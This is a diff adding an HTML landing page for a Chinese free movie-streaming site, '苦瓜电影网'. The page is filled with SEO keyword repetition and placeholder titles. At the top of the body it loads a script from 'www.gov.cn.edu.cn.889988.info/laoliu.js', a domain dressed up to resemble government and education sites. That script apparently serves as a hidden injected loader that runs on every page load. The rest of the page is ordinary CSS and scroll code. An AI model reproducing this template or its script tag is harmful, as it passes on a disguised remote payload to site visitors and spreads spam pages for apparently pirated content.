@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="index,follow">
+<title>苦瓜电影网 - 清凉影视在线观看平台</title>
+<meta name="description" content="苦瓜电影网提供最新高清电影、电视剧、动漫、综艺在线观看，海量资源免费播放，清爽体验尽在苦瓜电影网。">
+<meta name="keywords" content="苦瓜电影网,电影,高清电影,在线观看,苦瓜影视,kuguadianyingwang-h5">
+<link rel="canonical" href="https://kuguadianyingwang-h5">
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    body {
+        font-family: "PingFang SC", "Microsoft YaHei", -apple-system, sans-serif;
+        background: #f4f7f5;
+        color: #2d3a35;
+        line-height: 1.7;
+    }
+    a {
+        text-decoration: none;
+        color: #4a9d5b;
+        transition: all 0.3s;
+    }
+    a:hover {
+        color: #2e7d46;
+    }
+    ul {
+        list-style: none;
+    }
+
+    /* 顶部进度条 */
+    .scroll-progress {
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 4px;
+        background: linear-gradient(90deg, #7bc47f, #a8d5ba);
+        z-index: 2000;
+        width: 0%;
+        transition: width 0.2s;
+    }
+
+    /* 头部 */
+    header {
+        background: rgba(255,255,255,0.95);
+        backdrop-filter: blur(10px);
+        border-bottom: 2px solid #a8d5ba;
+        padding: 1rem 2rem;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 20px rgba(74,157,91,0.1);
+    }
+    nav {
+        max-width: 1200px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .logo {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: #4a9d5b;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+    .logo::before {
+        content: "🥒";
+        font-size: 1.8rem;
+    }
+    .nav-links {
+        display: flex;
+        gap: 2rem;
+    }
+    .nav-links a {
+        color: #2d3a35;
+        font-weight: 500;
+        position: relative;
+        padding: 0.3rem 0;
+    }
+    .nav-links a::after {
+        content: "";
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 0;
+        height: 2px;
+        background: #4a9d5b;
+        transition: width 0.3s;
+    }
+    .nav-links a:hover::after {
+        width: 100%;
+    }
+
+    main {
+        margin-top: 90px;
+        max-width: 1200px;
+        margin-left: auto;
+        margin-right: auto;
+        padding: 0 2rem 2rem;
+    }
+
+    /* 横幅 */
+    .hero {
+        background: linear-gradient(120deg, #7bc47f 0%, #4a9d5b 50%, #2e7d46 100%);
+        border-radius: 20px;
+        padding: 4rem 3rem;
+        margin-bottom: 3rem;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+    }
+    .hero::before {
+        content: "🎬";
+        position: absolute;
+        top: -20px;
+        right: 40px;
+        font-size: 8rem;
+        opacity: 0.15;
+        transform: rotate(15deg);
+    }
+    .hero::after {
+        content: "🥒";
+        position: absolute;
+        bottom: -20px;
+        left: 40px;
+        font-size: 6rem;
+        opacity: 0.15;
+        transform: rotate(-20deg);
+    }
+    .hero h1 {
+        font-size: 2.8rem;
+        color: #fff;
+        margin-bottom: 1rem;
+        position: relative;
+        z-index: 1;
+    }
+    .hero p {
+        font-size: 1.2rem;
+        color: rgba(255,255,255,0.9);
+        position: relative;
+        z-index: 1;
+    }
+
+    /* 区块通用 */
+    .section {
+        margin-bottom: 3rem;
+    }
+    .section-header {
+        display: flex;
+        align-items: center;
+        gap: 0.8rem;
+        margin-bottom: 1.5rem;
+    }
+    .section-header .icon {
+        font-size: 1.8rem;
+    }
+    .section-header h2 {
+        font-size: 1.6rem;
+        color: #2d3a35;
+    }
+    .section-header .line {
+        flex: 1;
+        height: 2px;
+        background: linear-gradient(90deg, #a8d5ba, transparent);
+        margin-left: 1rem;
+    }
+
+    /* 电影网格 */
+    .movie-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+        gap: 1.5rem;
+    }
+    .movie-card {
+        background: #fff;
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+        transition: all 0.3s;
+        border: 1px solid #e8f0ec;
+    }
+    .movie-card:hover {
+        transform: translateY(-6px);
+        box-shadow: 0 12px 30px rgba(74,157,91,0.2);
+    }
+    .movie-poster {
+        width: 100%;
+        height: 260px;
+        background: linear-gradient(135deg, #d4edda, #c8e6c9);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 3rem;
+        position: relative;
+    }
+    .movie-poster .badge {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        background: #e63950;
+        color: #fff;
+        font-size: 0.7rem;
+        padding: 2px 8px;
+        border-radius: 10px;
+    }
+    .movie-info {
+        padding: 1rem 1.2rem;
+    }
+    .movie-info h3 {
+        font-size: 1rem;
+        color: #2d3a35;
+        margin-bottom: 0.4rem;
+    }
+    .movie-info p {
+        font-size: 0.85rem;
+        color: #7a8b82;
+    }
+
+    /* 分类网格 */
+    .categories {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 1rem;
+    }
+    .cat-card {
+        background: #fff;
+        border-radius: 14px;
+        padding: 1.5rem 1rem;
+        text-align: center;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        transition: all 0.3s;
+        cursor: pointer;
+        border: 1px solid #e8f0ec;
+    }
+    .cat-card:hover {
+        background: #4a9d5b;
+        color: #fff;
+        transform: scale(1.05);
+    }
+    .cat-card .emoji {
+        font-size: 2.2rem;
+        display: block;
+        margin-bottom: 0.5rem;
+    }
+    .cat-card span {
+        font-weight: 600;
+    }
+
+    /* 排行榜 */
+    .ranking-list {
+        background: #fff;
+        border-radius: 16px;
+        padding: 1.5rem;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+    }
+    .rank-item {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        padding: 0.8rem 1rem;
+        border-radius: 10px;
+        margin-bottom: 0.5rem;
+        transition: background 0.3s;
+    }
+    .rank-item:hover {
+        background: #f0f7f2;
+    }
+    .rank-num {
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        background: #e8f0ec;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        font-size: 1rem;
+        color: #4a9d5b;
+        flex-shrink: 0;
+    }
+    .rank-item:nth-child(1) .rank-num {
+        background: #ffd700;
+        color: #fff;
+    }
+    .rank-item:nth-child(2) .rank-num {
+        background: #c0c0c0;
+        color: #fff;
+    }
+    .rank-item:nth-child(3) .rank-num {
+        background: #cd7f32;
+        color: #fff;
+    }
+    .rank-title {
+        flex: 1;
+        font-weight: 500;
+    }
+    .rank-score {
+        color: #e63950;
+        font-weight: 600;
+        font-size: 0.9rem;
+    }
+
+    /* 关于我们 */
+    .about-box {
+        background: #fff;
+        border-radius: 16px;
+        padding: 2rem;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+    }
+    .about-box p {
+        margin-bottom: 0.8rem;
+        color: #5a6b62;
+    }
+    .about-box strong {
+        color: #4a9d5b;
+    }
+
+    /* 底部 */
+    footer {
+        background: #2d3a35;
+        color: #a8d5ba;
+        padding: 2.5rem 2rem 1.5rem;
+        text-align: center;
+        margin-top: 2rem;
+    }
+    footer .footer-logo {
+        font-size: 1.4rem;
+        font-weight: 800;
+        color: #7bc47f;
+        margin-bottom: 1rem;
+    }
+    footer p {
+        font-size: 0.85rem;
+        opacity: 0.7;
+        margin-bottom: 0.5rem;
+    }
+    footer a {
+        color: #7bc47f;
+    }
+
+    /* 回到顶部 */
+    .back-top {
+        position: fixed;
+        bottom: 30px;
+        right: 30px;
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        background: #4a9d5b;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.2rem;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(74,157,91,0.4);
+        transition: all 0.3s;
+        opacity: 0;
+        visibility: hidden;
+        z-index: 999;
+    }
+    .back-top.show {
+        opacity: 1;
+        visibility: visible;
+    }
+    .back-top:hover {
+        background: #2e7d46;
+        transform: translateY(-3px);
+    }
+
+    /* 移动端 */
+    @media (max-width: 768px) {
+        header {
+            padding: 0.8rem 1rem;
+        }
+        nav {
+            flex-direction: column;
+            gap: 0.8rem;
+        }
+        .nav-links {
+            gap: 1rem;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .hero {
+            padding: 2.5rem 1.5rem;
+            border-radius: 16px;
+        }
+        .hero h1 {
+            font-size: 1.8rem;
+        }
+        .hero p {
+            font-size: 1rem;
+        }
+        main {
+            padding: 0 1rem 1rem;
+            margin-top: 110px;
+        }
+        .section-header h2 {
+            font-size: 1.3rem;
+        }
+        .movie-grid {
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+        }
+        .movie-poster {
+            height: 200px;
+        }
+        .categories {
+            grid-template-columns: repeat(2, 1fr);
+        }
+        .ranking-list {
+            padding: 1rem;
+        }
+    }
+
+    @media (max-width: 420px) {
+        .hero h1 {
+            font-size: 1.5rem;
+        }
+        .movie-grid {
+            grid-template-columns: 1fr;
+        }
+        .categories {
+            grid-template-columns: 1fr;
+        }
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header>
+    <nav>
+        <div class="logo">苦瓜电影网</div>
+        <div class="nav-links">
+            <a href="#home">首页</a>
+            <a href="#movies">电影</a>
+            <a href="#tv">电视剧</a>
+            <a href="#anime">动漫</a>
+            <a href="#ranking">排行榜</a>
+            <a href="#about">关于我们</a>
+        </div>
+    </nav>
+</header>
+
+<main>
+    <!-- 首页横幅 -->
+    <section id="home" class="hero">
+        <h1>🥒 苦瓜电影网 · 清爽观影体验</h1>
+        <p>https://kuguadianyingwang-h5 — 海量高清影视资源免费在线观看</p>
+    </section>
+
+    <!-- 电影栏目 -->
+    <section id="movies" class="section">
+        <div class="section-header">
+            <span class="icon">🎬</span>
+            <h2>最新电影</h2>
+            <span class="line"></span>
+        </div>
+        <p style="color:#7a8b82;margin-bottom:1.5rem;">苦瓜电影网每日更新最新院线大片，提供高清流畅的在线观看体验，不卡顿、不等待。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">🎞️<span class="badge">热门</span></div>
+                <div class="movie-info">
+                    <h3>电影名称 1</h3>
+                    <p>动作 / 2024 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎞️<span class="badge">推荐</span></div>
+                <div class="movie-info">
+                    <h3>电影名称 2</h3>
+                    <p>科幻 / 2024 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎞️<span class="badge">最新</span></div>
+                <div class="movie-info">
+                    <h3>电影名称 3</h3>
+                    <p>喜剧 / 2024 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎞️<span class="badge">热门</span></div>
+                <div class="movie-info">
+                    <h3>电影名称 4</h3>
+                    <p>爱情 / 2024 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎞️</div>
+                <div class="movie-info">
+                    <h3>电影名称 5</h3>
+                    <p>悬疑 / 2024 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎞️</div>
+                <div class="movie-info">
+                    <h3>电影名称 6</h3>
+                    <p>动画 / 2024 / 苦瓜电影网</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电视剧栏目 -->
+    <section id="tv" class="section">
+        <div class="section-header">
+            <span class="icon">📺</span>
+            <h2>热播电视剧</h2>
+            <span class="line"></span>
+        </div>
+        <p style="color:#7a8b82;margin-bottom:1.5rem;">在苦瓜电影网追剧，最新韩剧、美剧、国产剧一网打尽，每周同步更新。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">📽️</div>
+                <div class="movie-info">
+                    <h3>电视剧名称 1</h3>
+                    <p>剧情 / 40集 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">📽️</div>
+                <div class="movie-info">
+                    <h3>电视剧名称 2</h3>
+                    <p>悬疑 / 30集 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">📽️</div>
+                <div class="movie-info">
+                    <h3>电视剧名称 3</h3>
+                    <p>都市 / 36集 / 苦瓜电影网</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">📽️</div>
+                <div class="movie-info">
+                    <h3>电视剧名称 4</h3>
+                    <p>古装 / 50集 / 苦瓜电影网</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 动漫栏目 -->
+    <section id="anime" class="section">
+        <div class="section-header">
+            <span class="icon">🎨</span>
+            <h2>动漫频道</h2>
+            <span class="line"></span>
+        </div>
+        <p style="color:#7a8b82;margin-bottom:1.5rem;">苦瓜电影网为你精选最新日本动漫、国产动漫，每周同步更新，画质高清不卡顿。</p>
+        <div class="categories">
+            <div class="cat-card">
+                <span class="emoji">🔥</span>
+                <span>热血动漫</span>
+            </div>
+            <div class="cat-card">
+                <span class="emoji">💕</span>
+                <span>恋爱动漫</span>
+            </div>
+            <div class="cat-card">
+                <span class="emoji">🏰</span>
+                <span>奇幻冒险</span>
+            </div>
+            <div class="cat-card">
+                <span class="emoji">😂</span>
+                <span>搞笑动漫</span>
+            </div>
+            <div class="cat-card">
+                <span class="emoji">🤖</span>
+                <span>机甲科幻</span>
+            </div>
+            <div class="cat-card">
+                <span class="emoji">🎭</span>
+                <span>治愈系</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- 排行榜栏目 -->
+    <section id="ranking" class="section">
+        <div class="section-header">
+            <span class="icon">🏆</span>
+            <h2>热门排行榜</h2>
+            <span class="line"></span>
+        </div>
+        <p style="color:#7a8b82;margin-bottom:1.5rem;">苦瓜电影网实时统计播放数据，为你呈现最受欢迎的影视作品。</p>
+        <div class="ranking-list">
+            <div class="rank-item">
+                <div class="rank-num">1</div>
+                <div class="rank-title">热门影视作品第一名</div>
+                <div class="rank-score">⭐ 9.8</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">2</div>
+                <div class="rank-title">热门影视作品第二名</div>
+                <div class="rank-score">⭐ 9.6</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">3</div>
+                <div class="rank-title">热门影视作品第三名</div>
+                <div class="rank-score">⭐ 9.4</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">4</div>
+                <div class="rank-title">热门影视作品第四名</div>
+                <div class="rank-score">⭐ 9.2</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">5</div>
+                <div class="rank-title">热门影视作品第五名</div>
+                <div class="rank-score">⭐ 9.0</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">6</div>
+                <div class="rank-title">热门影视作品第六名</div>
+                <div class="rank-score">⭐ 8.8</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">7</div>
+                <div class="rank-title">热门影视作品第七名</div>
+                <div class="rank-score">⭐ 8.6</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">8</div>
+                <div class="rank-title">热门影视作品第八名</div>
+                <div class="rank-score">⭐ 8.5</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于我们 -->
+    <section id="about" class="section">
+        <div class="section-header">
+            <span class="icon">📝</span>
+            <h2>关于苦瓜电影网</h2>
+            <span class="line"></span>
+        </div>
+        <div class="about-box">
+            <p>苦瓜电影网（<strong>https://kuguadianyingwang-h5</strong>）是一个专注于提供高清影视资源的在线观看平台。我们致力于为影迷提供最新、最全的电影、电视剧、动漫和综艺节目，带来清爽无广告的观影体验。</p>
+            <p><strong>网站名称：</strong>苦瓜电影网</p>
+            <p><strong>网站网址：</strong>https://kuguadianyingwang-h5</p>
+            <p><strong>核心关键词：</strong>苦瓜电影网、苦瓜影视、高清电影在线观看、kuguadianyingwang-h5</p>
+            <p><strong>服务内容：</strong>最新电影、热播电视剧、精品动漫、综艺娱乐等全品类影视资源。</p>
+        </div>
+    </section>
+</main>
+
+<footer>
+    <div class="footer-logo">🥒 苦瓜电影网</div>
+    <p>© 2024 苦瓜电影网 (kuguadianyingwang-h5). All rights reserved.</p>
+    <p>网站名称：苦瓜电影网 | 网址：https://kuguadianyingwang-h5</p>
+    <p><a href="#home">返回顶部</a></p>
+</footer>
+
+<div class="back-top" id="backTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+
+<script>
+    // 滚动进度条
+    window.addEventListener('scroll', function() {
+        var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+        var scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+        var progress = (scrollTop / scrollHeight) * 100;
+        document.getElementById('scrollProgress').style.width = progress + '%';
+
+        // 回到顶部按钮
+        if (scrollTop > 300) {
+            document.getElementById('backTop').classList.add('show');
+        } else {
+            document.getElementById('backTop').classList.remove('show');
+        }
+    });
+
+    // 平滑滚动
+    document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+        anchor.addEventListener('click', function(e) {
+            e.preventDefault();
+            var target = document.querySelector(this.getAttribute('href'));
+            if (target) {
+                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
